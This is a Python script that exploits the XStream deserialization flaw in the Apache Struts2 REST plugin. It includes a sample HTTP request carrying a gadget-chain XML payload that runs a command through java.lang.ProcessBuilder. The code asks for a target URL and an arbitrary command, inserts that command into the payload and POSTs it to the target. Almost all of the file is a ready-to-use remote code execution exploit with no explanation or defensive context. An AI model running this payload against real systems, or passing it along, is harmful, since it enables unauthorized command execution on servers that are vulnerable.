import os, sys
import requests
from urllib.parse import urlparse
'''
POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 1663
Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1

<map> 
<entry> 
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map> 

'''

target = input("input the target url : ")
command_run = input("rce_command >> ")
print("You input target is {0}".format(target))
host_name = urlparse(target).netloc

headers = {
	"Host": host_name,
	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
	"Content-Type": "application/xml",
	"Content-Length": "1663",
	"Referer": target,
	"Connection": "close",
	"Upgrade-Insecure-Requests": "1"
}

xml_data = "<map> \
<entry> \
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> \
<value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"> \
<dataHandler> <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"> \
<is class=\"javax.crypto.CipherInputStream\"> <cipher class=\"javax.crypto.NullCipher\"> \
<initialized>false</initialized> <opmode>0</opmode> \
<serviceIterator class=\"javax.imageio.spi.FilterIterator\"> \
<iter class=\"javax.imageio.spi.FilterIterator\"> \
<iter class=\"java.util.Collections$EmptyIterator\"/> \
<next class=\"java.lang.ProcessBuilder\"> \
<command> <string>" + command_run + "</string> </command> \
<redirectErrorStream>false</redirectErrorStream> </next> </iter> \
<filter class=\"javax.imageio.ImageIO$ContainsFilter\"> \
<method> <class>java.lang.ProcessBuilder</class> \
<name>start</name> <parameter-types/> </method> \
<name>foo</name> </filter> <next class=\"string\">foo</next> \
</serviceIterator> <lock/> </cipher> \
<input class=\"java.lang.ProcessBuilder$NullInputStream\"/> \
<ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> \
<ofinish>0</ofinish> <closed>false</closed> </is> \
<consumed>false</consumed> </dataSource> <transferFlavors/> \
</dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> \
<jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/> \
</entry> <entry> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> \
<jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> \
</entry> \
</map> "

r = requests.post(target, headers = headers, data = xml_data)
#print(r.text)